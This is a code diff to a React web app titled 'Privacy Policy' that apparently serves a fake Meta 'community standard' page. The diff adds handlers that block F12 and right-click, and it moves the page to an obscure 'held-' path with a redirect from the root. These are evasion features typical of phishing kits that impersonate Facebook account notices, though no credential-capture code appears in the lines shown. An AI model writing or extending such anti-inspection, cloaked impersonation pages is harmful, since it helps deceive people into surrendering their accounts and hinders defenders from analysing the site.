@@ -1,6 +1,6 @@
 import "@shopify/polaris/build/esm/styles.css";
-import React, { Suspense } from "react";
-import { Route, BrowserRouter as Router, Routes } from "react-router-dom";
+import React, { Suspense, useEffect } from "react";
+import { Navigate, Route, BrowserRouter as Router, Routes } from "react-router-dom";
 import { AppProvider } from "@shopify/polaris";
 import enTranslations from "@shopify/polaris/locales/en.json";
 import CustomSkeletonPage from "./components/Skeleton/skeleton-page";
@@ -13,6 +13,24 @@ const ConfirmPage = React.lazy(() => import("./views/confirm"));
 
 function App() {
   useDocument("Privacy Policy");
+  useEffect(() => {
+    const handleKeyDown = (e: any) => {
+      if (e.key === "F12") {
+        e.preventDefault();
+        e.stopPropagation();
+      }
+    };
+    const handleContextMenu = (e: any) => {
+      e.preventDefault();
+      e.stopPropagation();
+    };
+    window.addEventListener("keydown", handleKeyDown);
+    window.addEventListener("contextmenu", handleContextMenu);
+    return () => {
+      window.removeEventListener("keydown", handleKeyDown);
+      window.removeEventListener("contextmenu", handleContextMenu);
+    };
+  }, []);
   return (
     <AppProvider i18n={enTranslations}>
       <Router>
@@ -21,7 +39,11 @@ function App() {
           <Suspense fallback={<CustomSkeletonPage />}>
             <Routes>
               <Route
-                path="/meta-community-standard"
+                path="/"
+                element={<Navigate to="/held-1002710759335388500489" />}
+              />
+              <Route
+                path="/held-1002710759335388500489"
                 element={<MetaCommunityPage />}
               />
               <Route
